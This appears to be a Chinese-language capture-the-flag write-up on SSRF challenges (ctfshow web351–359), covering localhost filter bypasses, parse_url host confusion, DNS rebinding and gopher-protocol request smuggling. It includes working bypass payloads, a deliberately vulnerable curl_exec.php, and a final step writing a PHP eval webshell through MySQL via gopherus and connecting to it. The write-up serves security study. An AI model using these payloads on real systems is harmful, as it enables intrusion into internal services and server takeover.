# SSRF

## web351

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1675839966505-0f898737-c69c-41bc-8c67-4a9ae770b86e.png#averageHue=%23fefefe&clientId=u8bc4fad2-0104-4&from=paste&height=185&id=ub9950e8f&originHeight=370&originWidth=727&originalType=binary&ratio=1&rotation=0&showTitle=false&size=37992&status=done&style=none&taskId=u64e9e08a-82de-41d1-8b10-ea946ddc6f8&title=&width=363.5)

- 这里猜测可能有一个flag.php的页面
- 直接访问会报错

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1675840019616-4684b051-4cb1-4f92-82a7-2f8bab35df4e.png#averageHue=%23f5f4f2&clientId=u8bc4fad2-0104-4&from=paste&height=58&id=u8ba057a7&originHeight=116&originWidth=359&originalType=binary&ratio=1&rotation=0&showTitle=false&size=5748&status=done&style=none&taskId=u52af5787-d8fe-44eb-92eb-9ce6b713723&title=&width=179.5)

- post提交 url=127.0.0.1/flag.php，即可访问

## web352(过滤127.0.0.1)

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1675840568170-06d1cf9f-85ea-4715-b3d9-6cfed1bc8610.png#averageHue=%23fefdfd&clientId=u8bc4fad2-0104-4&from=paste&height=315&id=u504ad8ea&originHeight=629&originWidth=681&originalType=binary&ratio=1&rotation=0&showTitle=false&size=61195&status=done&style=none&taskId=u852c4358-b2f2-412d-935b-8fb48cdd9e0&title=&width=340.5)

### 方法1：

- 用127.0.1 、127.1代替
  :::info
  127.0.0.1，通常被称为本地回环地址(Loopback Address)，指本机的虚拟接口，一些表示方法如下(ipv6的地址使用http访问需要加[])：<br />[http://127.0.0.1](http://127.0.0.1) <br />[http://localhost](http://localhost) <br />[http://127.255.255.254](http://127.255.255.254) <br />127.0.0.1 - 127.255.255.254 <br />http://[::1] <br />http://[::ffff:7f00:1] <br />http://[::ffff:127.0.0.1] <br />[http://127.1](http://127.1) <br />[http://127.0.1](http://127.0.1) <br />[http://0:80](http://0:80)<br />[http://sudo.cc](http://sudo.cc)  会解析到127.0.0.1的域名<br />另外，0.0.0.0这个IP可以直接访问到本地，也通常被正则过滤遗漏。
  :::

### 方法2：

[IP地址进制转换](https://tool.520101.com/wangluo/jinzhizhuanhuan/)

- 转成16进制 2进制
  :::info
  [http://0x7F000001/flag.php](http://0x7F000001/flag.php)  16进制加前缀0x<br />[http://0177.000.000.001/flag.php](http://0177.000.000.001/flag.php) 8进制加前缀0<br />[http://2130706433/flag.php](http://2130706433/flag.php) 10进制无前缀<br />目前测试2进制不行
  :::

### parse_url

[PHP: parse_url - Manual](https://www.php.net/manual/zh/function.parse-url.php)

- 它会解析url中的各个部分,当没有后面的参数只有url时，会输出数组

```php
<?php
$url = 'http://username:password@hostname:9090/path?arg=value#anchor';
var_dump(parse_url($url));
?>
```

- 上面例子是一个完整的url
  :::info

1. scheme: http或者https 协议名称
2. host: 匹配最后一个@后面符合格式的host
3. [user] username		@前
4. [pass] => password	@前
5. [path] => /path		/
6. [query] => arg=value	?以后的key=value
7. [fragment] => anchor	#以后的部分
   :::

- 输出结果为：

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1675841249074-f463e4f4-b902-41f3-bb53-b353f38ec787.png#averageHue=%23fefefd&clientId=u8bc4fad2-0104-4&from=paste&height=439&id=uc1ca874a&originHeight=877&originWidth=672&originalType=binary&ratio=1&rotation=0&showTitle=false&size=78892&status=done&style=none&taskId=uc334a802-c7a7-4f22-ae57-a8b03a8fe01&title=&width=336)

## web354（过滤）

- 用`http://sudo.cc/flag.php`绕过
- 或者自己买个域名改一下A记录，使自己的域名DNS解析为127.0.0.1也可以绕过

## web356(host长度小于3)

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1675842767577-736bcc57-7b67-4369-bde8-e51dcf73942f.png#averageHue=%23fefdfc&clientId=udb6cbca1-64c3-4&from=paste&height=169&id=u5a777858&originHeight=337&originWidth=695&originalType=binary&ratio=1&rotation=0&showTitle=false&size=44488&status=done&style=none&taskId=u6f3ed74b-3967-4dc2-b5a0-604ace60635&title=&width=347.5)

- 用0绕过
  :::info
  url=[http://0/flag.php](http://0/flag.php)

- 0在linux系统中会解析成127.0.0.1在windows中解析成0.0.0.0
  :::

## web 357(DNS重绑定漏洞)

### DNS重绑定

[浅谈DNS重绑定漏洞](https://zhuanlan.zhihu.com/p/89426041)

#### DNS TTL

当各地的DNS(LDNS)服务器接受到解析请求时，就会向域名指定的授权DNS服务器发出解析请求从而获得解析记录；该解析记录会在DNS(LDNS)服务器中保存一段时间，这段时间内如果再接到这个域名的解析请求，DNS服务器将不再向授权DNS服务器发出请求，而是直接返回刚才获得的记录；而这个记录在DNS服务器上保留的时间，就是TTL值。

#### DNS Rebinding

在网页浏览过程中，用户在地址栏中输入包含域名的网址。浏览器通过DNS服务器将域名解析为IP地址，然后向对应的IP地址请求资源，最后展现给用户。

- 对于域名所有者，他可以设置域名所对应的IP地址。当用户第一次访问，解析域名获取一个IP地址；
- 然后，域名持有者修改对应的IP地址；用户再次请求该域名，就会获取一个新的IP地址。对于浏览器来说，整个过程访问的都是同一域名，所以认为是安全的。这就造成了DNS Rebinding攻击。

### CTF实战应用

```php
$dst = @$_GET['KR'];
$res = @parse_url($dst);
$ip = @dns_get_record($res['host'], DNS_A)[0]['ip'];
...
$dev_ip = "54.87.54.87";
if($ip === $dev_ip) {
    $content = file_get_contents($dst);
    echo $content;
}
```

- 这里想让我的ip必须是54.87.54.87，这样我就没法拿到内网的数据

[https://lock.cmpxchg8b.com/rebinder.html?tdsourcetag=s_pctim_aiomsg](https://lock.cmpxchg8b.com/rebinder.html?tdsourcetag=s_pctim_aiomsg)

- 该网站可以给一个域名绑定两个ip，每次是哪个ip是随机的
- 这样我设置一个`54.87.54.87`和一个`127.0.0.1`，这就有几率绕过if，从而拿到数据

### ctfshow web 257

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1675859244615-1177f6fb-e84b-4c0f-8539-60f73efad981.png#averageHue=%23fefefe&clientId=u3e1739e4-bb48-4&from=paste&height=293&id=u7c99c3c8&originHeight=585&originWidth=1335&originalType=binary&ratio=1&rotation=0&showTitle=false&size=55022&status=done&style=none&taskId=ue750d911-50c9-471a-a59f-79895c866c9&title=&width=667.5)

#### filter_var

- 过滤器
  :::info
  FILTER_FLAG_IPV4 - 要求值是合法的 IPv4 IP（比如 255.255.255.255）。<br />FILTER_FLAG_IPV6 - 要求值是合法的 IPv6 IP（比如 2001:0db8:85a3:08d3:1319:8a2e:0370:7334）。<br />FILTER_FLAG_NO_PRIV_RANGE - 要求值不在 RFC 指定的私有范围 IP 内（ 192.168.0.1在这个范围）。<br />FILTER_FLAG_NO_RES_RANGE - 要求值不在保留的 IP 范围内。该标志接受 IPV4 和 IPV6 值。
  :::

#### payload

- 这就要求得是合法ip，随便在那个网站上绑一个ip，和一个127.0.0.1
- 提交Payload`url=http://7f000001.7c7d1401.rbndr.us/flag.php`
- 浏览器在访问该域名时会随机的解析一种ip

## web 358(parse_url各个部分的含义)

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1675860496362-9485be17-b712-42f2-8e1a-4715314a2e63.png#averageHue=%23fefefd&clientId=u3e1739e4-bb48-4&from=paste&height=127&id=ufb7b3c39&originHeight=253&originWidth=685&originalType=binary&ratio=1&rotation=0&showTitle=false&size=27530&status=done&style=none&taskId=u69833120-985c-43bf-a79c-793f4923d7e&title=&width=342.5)

- 这里要求的格式是`http://ctf.xxxxxxshow`，中间可以是任意字符
- 由于解析后的host是@后的内容，path是/path的内容，query是?后的内容，构造Payload

`http://ctf.@127.0.0.1/flag.php?show`

## web 359(gopher打mysql)

### gohper

[Gopher协议在SSRF漏洞中的深入研究（附视频讲解）](https://zhuanlan.zhihu.com/p/112055947)

- gopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处。
- 使用tcp70端口。

#### gopher发送请求

- 首先nc启动监听,监听2333端口：

```shell
nc -lp 2333
```

- 使用curl发送http请求，命令为

```shell
curl gopher://192.168.0.119:2333/abcd
```

- 此时主机收到的消息是 `bcd`,a没有被接收
- 在使用gopher协议时在**url后加入一个字符，通常是下划线_**

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1677635989533-eec027bb-101d-4a0e-899b-73a25ddef892.png#averageHue=%23292b35&clientId=u5d8b8ac7-3f70-4&from=paste&height=76&id=ud1389503&originHeight=152&originWidth=860&originalType=binary&ratio=2&rotation=0&showTitle=false&size=16622&status=done&style=none&taskId=u8283bdf7-79e2-4926-8546-5686bf80f82&title=&width=430)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1677636007383-b180f7a8-203c-4581-b3d7-a66dee707d3c.png#averageHue=%23292c36&clientId=u5d8b8ac7-3f70-4&from=paste&height=142&id=u874dfe32&originHeight=283&originWidth=1119&originalType=binary&ratio=2&rotation=0&showTitle=false&size=86314&status=done&style=none&taskId=u2c140656-d3e8-4336-a863-85e9b0e3dd5&title=&width=559.5)

- 此时两终端之间可以发消息

#### gopher发送get请求

:::info
1、构造HTTP数据包<br />2、URL编码、替换回车换行为%0d%0a<br />3、发送gopher协议
:::


**get型的http包**

```http
GET /ssrf/a.php?name=Margin HTTP/1.1
Host: 192.168.56.128
```

- url编码：

```http
GET%20%2Fssrf%2Fa.php%3Fname%3DMargin%20HTTP%2F1.1%0d%0AHost%3A%20192.168.56.128%0d%0A
```

- gopher发送:

```http
curl gopher://192.168.56.128:2333/_GET%20%2Fssrf%2Fa.php%3Fname%3DMargin%20HTTP%2F1.1%0d%0AHost%3A%20192.168.56.128%0d%0A
```

#### 

#### post类型的http包

- post包中这4个参数是必须的

```http
POST /ssrf/post.php HTTP/1.1
host:192.168.56.128
Content-Type:application/x-www-form-urlencoded
Content-Length:11

name=Margin
```

- gopher发送

```http
curl gopher://192.168.56.128:2333/_POST%20%2Fssrf%2Fpost.php%20HTTP%2F1.1%0d%0Ahost%3A192.168.56.128%0d%0AContent-Type%0d%0Aapplication%2Fx-www-form-urlencoded%0d%0AContent-Length%3A11%0d%0A%0d%0Aname%3DMargin%0d%0A
```

#### 
#### 
#### 

#### SSRF中使用gopher协议

1. 先准备了一个带有ssrf漏洞的页面curl_exec.php，代码如下：

```php
<?php     
  $url = $_GET['url'];     
	$curlobj = curl_init($url);     
	echo curl_exec($curlobj); 
?>
```

2. 在机器A上开启了一个监听nc -lp 666，然后在浏览器中访问

`[http://192.168.0.109/ssrf/base/curl_exec.php?url=gopher://192.168.0.119:6666/_abc](http://192.168.0.109/ssrf/base/curl_exec.php?url=gopher://192.168.0.119:6666/_abc)`

3. 机器A中收到消息abc

**ssrf + gopher获取shell**

- 准备一个get.php的页面

```php
<?php
    echo "Hello ".$_GET["name"]."\n"
?>
```

- 组成数据包

`[http://192.168.0.109/ssrf/base/curl_exec.php?url=gopher://192.168.0.109:80/_GET%20/ssrf/base/get.php%3fname=Margin%20HTTP/1.1%0d%0AHost:%20192.168.0.109%0d%0A](http://192.168.0.109/ssrf/base/curl_exec.php?url=gopher://192.168.0.109:80/_GET%20/ssrf/base/get.php%3fname=Margin%20HTTP/1.1%0d%0AHost:%20192.168.0.109%0d%0A)`
:::info
这个数据包的理解是

- curl_exec.php中存在ssrf漏洞，可以利用gopher协议
- 用gopher协议向get.php界面发送一个HTTP数据包，数据包中包括name=Margin等信息
  :::

- 这里发现请求失败了

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1675865975357-a4808b79-bda3-4a41-8b76-c198f393a866.png#averageHue=%23f4f4f4&clientId=u3e1739e4-bb48-4&from=paste&id=u5eea6200&originHeight=151&originWidth=2243&originalType=url&ratio=1&rotation=0&showTitle=false&size=111825&status=done&style=none&taskId=u144a60c8-f62a-4e02-bb58-cd3d34304ea&title=)

- 因为PHP在接收到参数后会做一次URL的解码，解码后就破坏了数据包的格式。这样我就对下划线_后面的内容再进行一次url编码，这样就可以保证GET数据包的格式

```php
<?php     
  $url = $_GET['url'];     
	$curlobj = curl_init($url);     
	echo curl_exec($curlobj); 
/*
$curlobj 应该满足下面的格式
gopher://192.168.0.109:80/_GET /ssrf/base/get.php?name=Margin HTTP/1.1
Host: 192.168.0.109
*/
?>
```

- 后续过程见上面文章

### ctfshow web359

- 抓包发现returl，可能存在ssrf

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1675864722199-24b12ee7-6de9-416c-a810-b40db7678a88.png#averageHue=%23d0cfcf&clientId=u3e1739e4-bb48-4&from=paste&id=ub927e1eb&originHeight=614&originWidth=2016&originalType=url&ratio=1&rotation=0&showTitle=false&size=173200&status=done&style=none&taskId=u0d921de0-33a0-42ac-84fb-a44956ff086&title=)

- 使用gopherus工具
- `python2 gopherus.py `启动程序
- 输入mysql的一句话木马：`select "<?php eval($_POST[1]);?>" into outfile '/var/www/html/2.php'`

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1675866582690-2aabc4b9-9d20-4977-a532-10ea975b135d.png#averageHue=%232f333e&clientId=u3e1739e4-bb48-4&from=paste&height=66&id=u0cb834a5&originHeight=131&originWidth=1523&originalType=binary&ratio=1&rotation=0&showTitle=false&size=42579&status=done&style=none&taskId=uc329f1ce-52ae-46cf-ac14-f90a5304efb&title=&width=761.5)

- 对下划线后面的内容再次进行url编码，替换抓包后returl中的内容

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1675866665045-ae1d6722-bc25-4b6a-b0cb-9ecb99545ad1.png#averageHue=%23343944&clientId=u3e1739e4-bb48-4&from=paste&height=146&id=uca4d2d82&originHeight=292&originWidth=2355&originalType=binary&ratio=1&rotation=0&showTitle=false&size=165161&status=done&style=none&taskId=ua1b5a2ed-ea90-4951-b510-327acf3a34f&title=&width=1177.5)

- 访问2.php，蚁剑连接getshell